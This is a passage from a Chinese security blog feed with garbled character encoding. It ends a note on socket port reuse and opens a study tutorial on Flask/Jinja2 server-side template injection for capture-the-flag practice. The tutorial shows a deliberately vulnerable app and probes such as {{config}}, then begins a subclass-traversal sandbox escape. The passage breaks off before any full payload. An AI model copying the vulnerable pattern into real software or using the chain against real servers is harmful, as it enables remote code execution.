port</span><br><span class="line">  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">  server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">  server.bind((serverHost, serverPort))</span><br><span class="line">  server.listen(<span class="number">5</span>)</span><br><span class="line">  msg = <span class="string">&quot; Server is Listening &lt;%s:%s&gt;\n  Waitingâ€¦â€¦&quot;</span> % (serverHost, serverPort)</span><br><span class="line">  print(Colors.CYAN + <span class="string">&quot;[*]&quot;</span> + Colors.END + msg)</span><br><span class="line">  clientSocket, clientAddress = server.accept()</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å†æ¬¡åœ¨Linuxä¸Šè¿›è¡Œæµ‹è¯•ï¼ŒæˆåŠŸç›‘å¬</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110191908243.png" alt="image4"></p><p>é™¤äº†SO_REUSEADDRï¼Œè¿˜æœ‰SO_REUSEPORTï¼Œå…·ä½“çš„åŒºåˆ«å¯ä»¥å‚è€ƒ</p><p><a href="https://www.jianshu.com/p/a23b7e8a4c6a">https://www.jianshu.com/p/a23b7e8a4c6a</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>å‚è€ƒï¼š</strong></p><p><a href="https://www.cnblogs.com/hqutcy/p/7142121.html">https://www.cnblogs.com/hqutcy/p/7142121.html</a></p><p><a href="https://book.douban.com/reading/33303128/">https://book.douban.com/reading/33303128/</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> ç½‘ç»œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP/IP time_wait </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Flask æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥(SSTI)</title>
      <link href="post/202010282133.html"/>
      <url>post/202010282133.html</url>
      
        <content type="html"><![CDATA[<p>ä¸SQLæ³¨å…¥ã€XSSç­‰å®‰å…¨æ¼æ´ä¸€æ ·ï¼ŒSSTIï¼ˆServer Site Template Injectionï¼‰ä¹Ÿæ˜¯å› ä¸ºå¯¹ç”¨æˆ·è¾“å…¥è¿‡æ»¤ä¸å½“å¯¼è‡´çš„ï¼Œå½“ç„¶è¿˜æœ‰å…¶ä»–åŸå› ï¼Œå¦‚ä»Šçš„åŠ¨æ€ç«™ç‚¹éƒ½ä¼šç”¨åˆ°æ¨¡æ¿æ¸²æŸ“ï¼Œè¿™å°±ä¼šæœ‰SSTIçš„é£é™©ã€‚</p><p>PythonæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ˜¯ç›¸å¯¹Flaskæ¡†æ¶è€Œè¨€çš„ï¼Œä¹‹å‰å¹¶æ²¡æœ‰ç”¨è¿‡è¯¥Webæ¡†æ¶ï¼Œæ˜¯åœ¨åšXCTFä¸­ç¢°åˆ°è¿™ç±»æ¼æ´ç›¸å…³é¢˜ç›®ï¼Œäºæ˜¯ç°å­¦ç°å–ï¼Œå†™ä¸€ç¯‡SSTIçš„å­¦ä¹ æ€»ç»“ï¼Œé¡ºä¾¿å†™å‡ºXCTFä¸­ä¸¤é“ä¸è¯¥æ¼æ´ç›¸å…³é¢˜ç›®çš„WriteUp</p><h3 id="ä¸€ã€FlaskåŸºç¡€"><a href="#ä¸€ã€FlaskåŸºç¡€" class="headerlink" title="ä¸€ã€FlaskåŸºç¡€"></a>ä¸€ã€FlaskåŸºç¡€</h3><p>Flaskæ˜¯pythonä¸­çš„ä¸€ä¸ªè½»é‡çº§Webæ¡†æ¶ï¼Œèƒ½å¤Ÿå¾ˆè½»æ˜“æ­å»ºä¸€ä¸ªWebç«™ç‚¹ï¼Œä½¿ç”¨Jinja2ä½œä¸ºæ¨¡æ¿å¼•æ“ã€‚</p><p>æ‰€è°“æ¨¡æ¿å¼•æ“å°±æ˜¯åœ¨åŠ¨æ€ç«™ç‚¹ä¸­ï¼Œå°†æ˜¾ç¤ºå†…å®¹å’Œç”¨æˆ·æ•°æ®åˆ†ç¦»ï¼Œä¸åŒç”¨æˆ·æŸ¥çœ‹åŒä¸€é¡µé¢è¿”å›çš„æ˜¯è‡ªå·±çš„ç”¨æˆ·æ•°æ®é€šè¿‡æ¨¡æ¿æ¸²æŸ“åçš„é¡µé¢å†…å®¹ï¼Œæ‰€ä»¥ä¸€èˆ¬æ¨¡æ¿æ–‡ä»¶éƒ½æ˜¯æ ‡å‡†çš„HTMLæ–‡ä»¶ã€‚</p><p>Flaské»˜è®¤çš„Jinja2å¼•æ“å­˜åœ¨ä»¥ä¸‹ä¸‰ç§è¯­æ³•ï¼š</p><ul><li><p> æ§åˆ¶ç»“æ„ <code>&#123;% %&#125;</code> </p></li><li><p> å˜é‡å–å€¼ <code>&#123;&#123; &#125;&#125;</code> </p></li><li><p>æ³¨é‡Š <code>&#123;# #&#125;</code> </p><p>ä½¿ç”¨ <strong><code>&#123;&#123; &#125;&#125;</code></strong> è¯­æ³•è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„å ä½ç¬¦ã€‚å½“åˆ©ç”¨jinja2è¿›è¡Œæ¸²æŸ“çš„æ—¶å€™ï¼Œå®ƒä¼šæŠŠè¿™äº›ç‰¹æ®Šçš„å ä½ç¬¦è¿›è¡Œå¡«å……/æ›¿æ¢ ã€‚<strong>å¦‚æœ <code>&#123;&#123; &#125;&#125;</code> ä¸­çš„å†…å®¹æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œé‚£ä¹ˆè¾“å…¥çš„æ¶æ„æ•°æ®å°±ä¼šå¸¦å…¥å¹¶æ‰§è¡Œï¼Œé€ æˆSSTIã€‚</strong></p></li></ul><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ¨¡æ¿æ–‡ä»¶ç¤ºä¾‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>nameï¼š&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>ageï¼š&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨ä¸Šè¾¹çš„æ¨¡æ¿æ–‡ä»¶ä¸­ï¼Œå½“è¿›è¡Œæ¸²æŸ“æ—¶å°±ä¼šå°†æŸ¥è¯¢/ä¼ å…¥çš„nameå’Œageè¿›è¡Œæ›¿æ¢ï¼Œå†è¾“å‡ºåˆ°é¡µé¢ã€‚</p><p>åœ¨Flaskä¸­æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼è¿›è¡Œæ¸²æŸ“ï¼š</p><ul><li><p>render_template_string(str)ï¼šç›´æ¥å¯¹strè¿›è¡Œæ¸²æŸ“</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&lt;h1&gt;name: %s, age: %d&lt;/h1&gt;&quot;</span> % (name, age)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure></li><li><p>render_template(file)ï¼šè°ƒç”¨æ¨¡æ¿æ–‡ä»¶fileè¿›è¡Œæ¸²æŸ“</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, name=name, age=age)</span><br></pre></td></tr></table></figure><p>ä¸¤ç§æ¸²æŸ“æ–¹å¼æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</p></li></ul><h3 id="äºŒã€SSTIç¯å¢ƒæ­å»ºåŠæµ‹è¯•"><a href="#äºŒã€SSTIç¯å¢ƒæ­å»ºåŠæµ‹è¯•" class="headerlink" title="äºŒã€SSTIç¯å¢ƒæ­å»ºåŠæµ‹è¯•"></a>äºŒã€SSTIç¯å¢ƒæ­å»ºåŠæµ‹è¯•</h3><p>å¤§è‡´äº†è§£Flaskç›¸å…³çŸ¥è¯†åï¼Œæ­å»ºä¸€ä¸ªç®€å•çš„SSTIæ¼æ´æµ‹è¯•ç¯å¢ƒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    person = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;7d793037a0760186574b0282f2f435e7&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;name&quot;</span>):</span><br><span class="line">        person[<span class="string">&quot;name&quot;</span>] = request.args.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">        template = <span class="string">&quot;&lt;h2&gt;Hello %s&lt;/h2&gt;&quot;</span> % person[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        template = <span class="string">&quot;&lt;h2&gt;You should set a name!&lt;/h2&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å®ç°çš„åŠŸèƒ½å°±æ˜¯GETä¼ å‚nameï¼Œç„¶åä½¿ç”¨Jinja2åšæ¨¡æ¿æ¸²æŸ“ï¼Œå†è¾“å‡ºåˆ°é¡µé¢ã€‚</p><p>ä¼ å…¥æ­£å¸¸æ•°æ®ï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898888.png" alt="1603554366898.png"></p><p>ä¼ å…¥æµ‹è¯•æ•°æ®ï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898897.png" alt="1603554388274.png"></p><p>å¯è§**<code>&#123;&#123;&#125;&#125;`**ä¸­çš„è¡¨è¾¾å¼è¢«æˆåŠŸæ‰§è¡Œï¼Œå³è¡¨ç¤ºå­˜åœ¨SSTIï¼Œç»§ç»­è¾“å…¥**`&#123;&#123;config&#125;&#125;</code>**ï¼Œå³å¯æ‰§è¡ŒconfigæŸ¥çœ‹Flaskç›¸å…³é…ç½®ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898906.png" alt="1603554475271.png"></p><p>å½“ç„¶SSTIçš„å±å®³ä¸æ­¢äºæ­¤ï¼Œåˆ©ç”¨è¯¥æ¼æ´ç”šè‡³å¯ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€GetShellï¼Œè¿™å°±éœ€è¦<strong>æ²™ç›’é€ƒé€¸</strong>ã€‚</p><h3 id="ä¸‰ã€æ²™ç›’é€ƒé€¸"><a href="#ä¸‰ã€æ²™ç›’é€ƒé€¸" class="headerlink" title="ä¸‰ã€æ²™ç›’é€ƒé€¸"></a>ä¸‰ã€æ²™ç›’é€ƒé€¸</h3><p>æ‰€è°“æ²™ç›’/æ²™ç®±ï¼Œå…¶å®å°±æ˜¯å°†ç¨‹åºè¿è¡Œåœ¨ç‹¬ç«‹çš„ç¯å¢ƒä¸­ï¼Œæ¥å‡å°ç¨‹åºå¼‚å¸¸ï¼ˆç—…æ¯’ç­‰ï¼‰æ—¶é€ æˆçš„å±å®³ï¼Œé€šå¸¸æ²™ç›’ç¯å¢ƒéƒ½ä¼šå¯¹ç¯å¢ƒä¸­çš„å¯ç”¨çš„åŠŸèƒ½åšä»¥é™åˆ¶ã€‚</p><p>å› æ­¤ï¼Œæ²™ç›’é€ƒé€¸å³ç»•è¿‡æ²™ç›’ç¯å¢ƒä¸­çš„ç§ç§é™åˆ¶å’Œè¿‡æ»¤ï¼Œæ‹¿åˆ°ä¸»æœºçš„æƒé™æˆ–shellã€‚</p><p>å¯¹äºpythonä¸­SSTIçš„æ²™ç›’é€ƒé€¸åˆ©ç”¨ï¼Œåˆ™éœ€è¦å…ˆäº†è§£ä»¥ä¸‹çŸ¥è¯†ç‚¹ï¼š</p><h4 id="1ã€å†…å»ºå‡½æ•°"><a href="#1ã€å†…å»ºå‡½æ•°" class="headerlink" title="1ã€å†…å»ºå‡½æ•°"></a>1ã€å†…å»ºå‡½æ•°</h4><p>pythonå†…éƒ¨å·²ç»å®šä¹‰å¹¶åˆ›å»ºäº†è®¸å¤šå‡½æ•°å¯ä¾›ä½¿ç”¨ï¼Œä¸éœ€è¦ç”¨æˆ·å†å®šä¹‰ï¼Œç§°ä¹‹ä¸ºå†…å»ºå‡½æ•°ï¼Œæ¯”å¦‚<code>range()ã€print()ã€input()ã€type()</code>ç­‰</p><p>è¿™äº›å¯ä½¿ç”¨çš„å†…å»ºå‡½æ•°å­˜å‚¨åœ¨<code>__builtins__</code>å†…å»ºå¯¹è±¡ä¸­ï¼Œå½“å¼€å¯pythonè§£é‡Šå™¨æ—¶ç¨‹åºä¼šè‡ªåŠ¨å°†è¯¥å¯¹è±¡å¯¼å…¥åˆ°å‘½åç©ºé—´ï¼Œä¹Ÿå°±æ˜¯è‡ªåŠ¨å¯¼å…¥è¯¥æ¨¡å—ï¼ˆ<code>import __builtin__</code>ï¼‰æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨å…¶ä¸­çš„å†…å»ºå‡½æ•°ã€‚</p><p>ä½¿ç”¨dir()å‡½æ•°æŸ¥çœ‹å¯ä½¿ç”¨çš„å†…å»ºå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">dir</span>(__builtins__)): print(i)</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; for i in enumerate(__builtins__.__dict__): print(i)</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, <span class="string">&#x27;ArithmeticError&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;AssertionError&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;AttributeError&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;BaseException&#x27;</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="string">&#x27;BufferError&#x27;</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">&#x27;BytesWarning&#x27;</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="string">&#x27;EOFError&#x27;</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="string">&#x27;Ellipsis&#x27;</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="string">&#x27;Exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">â€¦â€¦</span><br><span class="line"></span><br><span class="line">(<span class="number">115</span>, <span class="string">&#x27;open&#x27;</span>)</span><br><span class="line">(<span class="number">116</span>, <span class="string">&#x27;ord&#x27;</span>)</span><br><span class="line">(<span class="number">117</span>, <span class="string">&#x27;pow&#x27;</span>)</span><br><span class="line">(<span class="number">118</span>, <span class="string">&#x27;print&#x27;</span>)</span><br><span class="line">(<span class="number">119</span>, <span class="string">&#x27;property&#x27;</span>)</span><br><span class="line">(<span class="number">120</span>, <span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line">(<span class="number">121</span>, <span class="string">&#x27;range&#x27;</span>)</span><br><span class="line">(<span class="number">122</span>, <span class="string">&#x27;raw_input&#x27;</span>)</span><br><span class="line">(<span class="number">123</span>, <span class="string">&#x27;reduce&#x27;</span>)</span><br><span class="line">(<span class="number">124</span>, <span class="string">&#x27;reload&#x27;</span>)</span><br><span class="line">(<span class="number">125</span>, <span class="string">&#x27;repr&#x27;</span>)</span><br><span class="line">(<span class="number">126</span>, <span class="string">&#x27;reversed&#x27;</span>)</span><br><span class="line">(<span class="number">127</span>, <span class="string">&#x27;round&#x27;</span>)</span><br><span class="line">(<span class="number">128</span>, <span class="string">&#x27;set&#x27;</span>)</span><br><span class="line">(<span class="number">129</span>, <span class="string">&#x27;setattr&#x27;</span>)</span><br><span class="line">(<span class="number">130</span>, <span class="string">&#x27;slice&#x27;</span>)</span><br><span class="line">(<span class="number">131</span>, <span class="string">&#x27;sorted&#x27;</span>)</span><br><span class="line">(<span class="number">132</span>, <span class="string">&#x27;staticmethod&#x27;</span>)</span><br><span class="line">(<span class="number">133</span>, <span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">(<span class="number">134</span>, <span class="string">&#x27;sum&#x27;</span>)</span><br><span class="line">(<span class="number">135</span>, <span class="string">&#x27;super&#x27;</span>)</span><br><span class="line">(<span class="number">136</span>, <span class="string">&#x27;tuple&#x27;</span>)</span><br><span class="line">(<span class="number">137</span>, <span class="string">&#x27;type&#x27;</span>)</span><br><span class="line">(<span class="number">138</span>, <span class="string">&#x27;unichr&#x27;</span>)</span><br><span class="line">(<span class="number">139</span>, <span class="string">&#x27;unicode&#x27;</span>)</span><br><span class="line">(<span class="number">140</span>, <span class="string">&#x27;vars&#x27;</span>)</span><br><span class="line">(<span class="number">141</span>, <span class="string">&#x27;xrange&#x27;</span>)</span><br><span class="line">(<span class="number">142</span>, <span class="string">&#x27;zip&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2ã€é­”æœ¯æ–¹æ³•"><a href="#2ã€é­”æœ¯æ–¹æ³•" class="headerlink" title="2ã€é­”æœ¯æ–¹æ³•"></a>2ã€é­”æœ¯æ–¹æ³•</h4><p><code>__dict__</code>ï¼š</p><p>ç±»çš„<code>__dict__</code>é‡Œå­˜æ”¾ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§ã€‚<br>å¯¹è±¡çš„<code>__dict__</code>ä¸­å­˜å‚¨ä¸€äº›self.xxxçš„ä¸€äº›ä¸œè¥¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.b = <span class="number">2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">A = Test()</span><br><span class="line">print(Test.__dict__)</span><br><span class="line">print(A.__dict__)</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">&#123;<span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;__init__&#x27;</span>: &lt;function Test.__init__ at <span class="number">0x000001D060883D08</span>&gt;, <span class="string">&#x27;fun&#x27;</span>: &lt;function Test.fun at <span class="number">0x000001D060883E18</span>&gt;, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;Test&#x27;</span> objects&gt;, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;Test&#x27;</span> objects&gt;, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨<code>__dict__</code>æ–¹æ³•æŸ¥çœ‹æŒ‡å®šç±»çš„å‡½æ•°ï¼Œæ¯”å¦‚æ­¤å‰çš„æŸ¥çœ‹æ‰€æœ‰å†…å»ºå‡½æ•°ï¼š<code>__builtins__.__dict__</code></p><p><code>__globals__</code>å’Œ<code>__getattribute__()</code>åœ¨å‚è€ƒæ–‡ç« ä¸­æœ‰è¯¦è¿°ã€‚</p><h4 id="3ã€ç±»ç»§æ‰¿"><a href="#3ã€ç±»ç»§æ‰¿" class="headerlink" title="3ã€ç±»ç»§æ‰¿"></a>3ã€ç±»ç»§æ‰¿</h4><p>pythonä¸­å¯¹ä¸€ä¸ªå˜é‡åº”ç”¨<strong>class</strong>æ–¹æ³•ä»ä¸€ä¸ªå˜é‡å®ä¾‹åŒ–ä¸ºå¯¹è±¡ç±»å‹åï¼Œç±»æœ‰ä»¥ä¸‹ä¸‰ç§å…³äºç»§æ‰¿å…³ç³»çš„æ–¹æ³•</p><ul><li><code>__base__</code> //å¯¹è±¡çš„ä¸€ä¸ªåŸºç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯objectï¼Œæœ‰æ—¶ä¸æ˜¯ï¼Œè¿™æ—¶éœ€è¦ä½¿ç”¨ä¸‹ä¸€ä¸ªæ–¹æ³•</li><li><code>__mro__</code> //åŒæ ·å¯ä»¥è·å–å¯¹è±¡çš„åŸºç±»ï¼Œåªæ˜¯è¿™æ—¶ä¼šæ˜¾ç¤ºå‡ºæ•´ä¸ªç»§æ‰¿é“¾çš„å…³ç³»ï¼Œæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œobjectåœ¨æœ€åº•å±‚æ•…åœ¨åˆ—è¡¨ä¸­çš„æœ€åï¼Œé€šè¿‡<code>__mro__[-1]</code>å¯ä»¥è·å–åˆ°</li><li><code>__subclasses__()</code> //ç»§æ‰¿æ­¤å¯¹è±¡çš„å­ç±»ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨</li></ul><p>æœ‰è¿™äº›ç±»ç»§æ‰¿çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥<strong>ä»ä»»ä½•ä¸€ä¸ªå˜é‡ï¼Œå›æº¯åˆ°åŸºç±»ä¸­å»ï¼Œå†è·å¾—åˆ°æ­¤åŸºç±»æ‰€æœ‰å®ç°çš„ç±»</strong>ï¼Œå°±èƒ½ä½¿ç”¨æ‰€æœ‰åŸºç±»ä¸‹çš„å­ç±»åŠå…¶æ–¹æ³•äº†ã€‚</p><p>æ¯”å¦‚ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé¦–å…ˆè·å¾—å…¶å½“å‰ç±»ï¼Œå¾—åˆ°strç±»ï¼›å†è·å¾—å…¶åŸºç±»ï¼Œä¹Ÿå°±æ˜¯objectç±»ï¼Œå†è·å¾—objectç±»çš„æ‰€æœ‰å­ç±»ï¼Œå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__<span class="comment"># è·å¾—å½“å‰ç±»</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span>.<span class="title">__base__</span># è·å¾—åŸºç±»</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()# è·å¾—åŸºç±»çš„æ‰€æœ‰å­ç±»</span></span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class 